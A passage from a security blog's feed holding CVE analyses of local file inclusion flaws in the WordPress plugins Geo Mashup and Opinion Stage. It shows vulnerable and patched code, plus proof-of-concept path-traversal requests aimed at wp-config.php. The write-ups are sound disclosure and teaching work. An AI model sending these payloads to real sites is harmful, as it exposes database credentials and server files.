logic&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;File existence related logic&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;When an attacker sends &lt;code&gt;$_GET[&#39;template&#39;]&lt;/code&gt; containing &lt;code&gt;../&lt;/code&gt; the file will by default not exist, and &lt;code&gt;locate_template()&lt;/code&gt; returns &lt;code&gt;&#39;&#39;&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Returning to &lt;code&gt;GeoMashup::locate_template()&lt;/code&gt;, when &lt;code&gt;$template&lt;/code&gt; is empty and not readable (&lt;code&gt;!is_readable($template)&lt;/code&gt;) it is reassigned and returned.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;const string GEO_MASHUP_DIR_PATH = &amp;#34;/srv/www/wordpress/wp-content/plugins/geo-mashup&amp;#34;&#xA;&#xA;GEO_MASHUP_DIR_PATH.default-templates/$template_base.php&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 &lt;code&gt;GeoMashup::locate_template()&lt;/code&gt; does not modify &lt;code&gt;$template_base&lt;/code&gt; which we control, so we proceed to find a way to trigger this behavior.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ( isset( $_GET[&amp;#39;output&amp;#39;] ) and &amp;#39;json&amp;#39; == $_GET[&amp;#39;output&amp;#39;] ) or empty( $_GET[&amp;#39;object_ids&amp;#39;] ) ) {&#xA;&#x9;GeoMashupQuery::generate_location_json( );&#xA;} else {&#xA;&#x9;GeoMashupQuery::generate_object_html( );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;generate_object_html()&lt;/code&gt; is only called when &lt;code&gt;$_GET[&#39;output&#39;]&lt;/code&gt; is not provided and &lt;code&gt;$_GET[&#39;object_ids&#39;]&lt;/code&gt; is not empty.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;geo-query.php&lt;/strong&gt; containing the above logic is invoked in &lt;strong&gt;geo-mashup.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-13-cve-2025-48293/search1.png&#34;&#xA;    alt=&#34;geo-query.php is called within geo-mashup.php&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;&lt;strong&gt;geo-query.php&lt;/strong&gt; is called within &lt;strong&gt;geo-mashup.php&lt;/strong&gt;&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;The &lt;code&gt;geo_query&lt;/code&gt; function is the callback for an &lt;strong&gt;Unauthenticated&lt;/strong&gt; action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_geo_mashup_query&amp;#39;, array( __CLASS__, &amp;#39;geo_query&amp;#39;) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When accessing the endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with &lt;code&gt;action=geo_mashup_query&lt;/code&gt; the &lt;code&gt;geo_query&lt;/code&gt; callback is executed.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Add code to &lt;code&gt;wp-config.php&lt;/code&gt; for testing&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;echo &amp;#34;Payload&amp;#34;;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Send a &lt;strong&gt;GET request&lt;/strong&gt; with an &lt;strong&gt;LFI&lt;/strong&gt; payload&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-ajax.php?action=geo_mashup_query&amp;amp;object_ids=2&amp;amp;template=../../../../wp-config HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: vi,en-US;q=0.7,en;q=0.3&#xA;Accept-Encoding: gzip, deflate, br&#xA;Connection: keep-alive&#xA;Upgrade-Insecure-Requests: 1&#xA;Sec-Fetch-Dest: document&#xA;Sec-Fetch-Mode: navigate&#xA;Sec-Fetch-Site: none&#xA;Sec-Fetch-User: ?1&#xA;X-PwnFox-Color: green&#xA;Priority: u=0, i&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-13-cve-2025-48293/result.png&#34;&#xA;    alt=&#34;Successful LFI result&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Successful LFI result&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-48293 is an LFI caused by using the &lt;code&gt;template&lt;/code&gt; input without validation when concatenating into a fallback path, allowing path traversal (&lt;code&gt;..&lt;/code&gt;) and inclusion of unintended files. It was fixed in &lt;strong&gt;v1.13.17&lt;/strong&gt; by applying &lt;code&gt;sanitize_key()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Do not use user input directly to build paths for includes.&lt;/li&gt;&#xA;&lt;li&gt;Use a &lt;strong&gt;whitelist&lt;/strong&gt; or &lt;code&gt;sanitize_key()&lt;/code&gt; + &lt;code&gt;realpath()&lt;/code&gt; checks.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/geo-mashup/vulnerability/wordpress-geo-mashup-plugin-1-13-16-local-file-inclusion-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Geo Mashup Plugin &amp;lt;= 1.13.16 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-53328 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-12-cve-2025-53328/</link>
      <pubDate>Sun, 12 Oct 2025 19:18:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-12-cve-2025-53328/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-12-cve-2025-53328/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Poll, Survey &amp;amp; Quiz Maker Plugin by Opinion Stage&lt;/strong&gt; version &lt;strong&gt;≤ 19.11.0&lt;/strong&gt; contains a &lt;strong&gt;Local File Inclusion (CVE-2025-53328, CVSS 7.5)&lt;/strong&gt; vulnerability that allows an unauthenticated attacker to control the file parameter in an &lt;code&gt;include/require&lt;/code&gt; call, enabling inclusion or reading of local files on the server (e.g., configuration files containing credentials), leading to disclosure of sensitive information and, in some configurations, potential code execution.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-53328&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-53328&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 19.11.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 19.11.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (7.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/social-polls-by-opinionstage/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Poll, Survey &amp;amp; Quiz Maker Plugin by Opinion Stage Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;alert alert-important&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 1.75C0 .784.784.0 1.75.0h12.5C15.216.0 16 .784 16 1.75v9.5A1.75 1.75.0 0114.25 13H8.06l-2.573 2.573A1.458 1.458.0 013 14.543V13H1.75A1.75 1.75.0 010 11.25zm1.75-.25a.25.25.0 00-.25.25v9.5c0 .138.112.25.25.25h2a.75.75.0 01.75.75v2.19l2.72-2.72a.749.749.0 01.53-.22h6.5a.25.25.0 00.25-.25v-9.5a.25.25.0 00-.25-.25zm7 2.25v2.5a.75.75.0 01-1.5.0v-2.5a.75.75.0 011.5.0zM9 9A1 1 0 117 9a1 1 0 012 0z&#34;/&gt;&lt;/svg&gt;Important&lt;/p&gt;&lt;p&gt;Although the vulnerability is published as &lt;strong&gt;Unauthenticated&lt;/strong&gt;, in many deployments exploitation practically requires minimal internal privileges — for example a &lt;strong&gt;Contributor&lt;/strong&gt; account or equivalent in WordPress.&lt;/p&gt;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Poll, Survey &amp;amp; Quiz Maker Plugin by Opinion Stage&lt;/strong&gt;: &lt;strong&gt;19.11.0&lt;/strong&gt; (vulnerable) and &lt;strong&gt;19.11.1&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool to compare differences between versions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Vulnerable version&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private static function prepare_view_file_name_form_current_page() {&#xA;    $view_file_name = &amp;#39;&amp;#39;;&#xA;&#xA;    if ( !empty( $_REQUEST[&amp;#39;page&amp;#39;] ) ) {&#xA;        $qry_str_check_os = sanitize_text_field( $_REQUEST[&amp;#39;page&amp;#39;] );&#xA;        $qry_str_check_os = explode( &amp;#39;-&amp;#39;, $qry_str_check_os );&#xA;        if ( &amp;#39;opinionstage&amp;#39; === $qry_str_check_os[0] ) {&#xA;            $view_file_name = str_replace( &amp;#39;opinionstage-&amp;#39;, &amp;#39;&amp;#39;, sanitize_text_field( $_REQUEST[&amp;#39;page&amp;#39;] ) );&#xA;            $view_file_name = str_replace( &amp;#39;-&amp;#39;, &amp;#39;_&amp;#39;, $view_file_name );&#xA;        }&#xA;    }&#xA;&#xA;    return $view_file_name;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the &lt;strong&gt;vulnerable&lt;/strong&gt; version, the &lt;code&gt;page&lt;/code&gt; parameter is taken from &lt;code&gt;$_REQUEST&lt;/code&gt; and controlled by the user but the file name is &lt;strong&gt;not properly validated&lt;/strong&gt; → allowing &lt;strong&gt;Local File Inclusion&lt;/strong&gt;. The function only uses &lt;code&gt;sanitize_text_field&lt;/code&gt; and checks the &lt;code&gt;opinionstage-&lt;/code&gt; prefix, then removes the prefix and replaces &lt;code&gt;-&lt;/code&gt; with &lt;code&gt;_&lt;/code&gt;, so an attacker can supply:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;?page=opinionstage-../../wp-config&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Patched version&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private static function prepare_view_file_name_from_current_page() {&#xA;&#xA;    if (empty($_REQUEST[&amp;#39;page&amp;#39;]) || !is_string($_REQUEST[&amp;#39;page&amp;#39;])) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    $page = sanitize_text_field($_REQUEST[&amp;#39;page&amp;#39;]);&#xA;&#xA;    if (substr($page, 0, strlen(&amp;#39;opinionstage-&amp;#39;)) !== &amp;#39;opinionstage-&amp;#39;) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    $template_name = substr($page, strlen(&amp;#39;opinionstage-&amp;#39;));&#xA;    $template_name = str_replace(&amp;#39;-&amp;#39;, &amp;#39;_&amp;#39;, $template_name);&#xA;&#xA;    if (!in_array($template_name, self::$allowed_templates, true)) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    if (strpos($template_name, &amp;#39;..&amp;#39;) !== false ||&#xA;        strpos($template_name, &amp;#39;/&amp;#39;) !== false ||&#xA;        strpos($template_name, &amp;#39;\\&amp;#39;) !== false) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    return $template_name;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch adds multiple protections: type checking, prefix verification (&lt;code&gt;&amp;quot;opinionstage-&amp;quot;&lt;/code&gt;), a whitelist (&lt;code&gt;self::$allowed_templates&lt;/code&gt;), and blocking traversal characters.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;The function &lt;code&gt;prepare_view_file_name_form_current_page()&lt;/code&gt; is called from &lt;code&gt;load_template()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function load_template() {&#xA;    $view_file_name = self::prepare_view_file_name_form_current_page();&#xA;    if ( !$view_file_name ) {&#xA;        return;&#xA;    }&#xA;&#xA;    $os_client_logged_in = Helper::is_user_logged_in();&#xA;    $os_options = Helper::get_opinionstage_option();&#xA;&#xA;    TemplatesViewer::require_template( &amp;#39;admin/views/&amp;#39; . $view_file_name, compact( &amp;#39;os_client_logged_in&amp;#39;, &amp;#39;os_options&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;require_template()&lt;/code&gt; is invoked with &lt;code&gt;&#39;admin/views/&#39;.$view_file_name&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function require_template($template_name, $args = []) {&#xA;    $path = Opinionstage::get_instance()-&amp;gt;plugin_path . $template_name . &amp;#39;.php&amp;#39;;&#xA;&#xA;    if( ! file_exists( $path ) ) {&#xA;        return;&#xA;    }&#xA;&#xA;    extract($args);&#xA;    require( $path 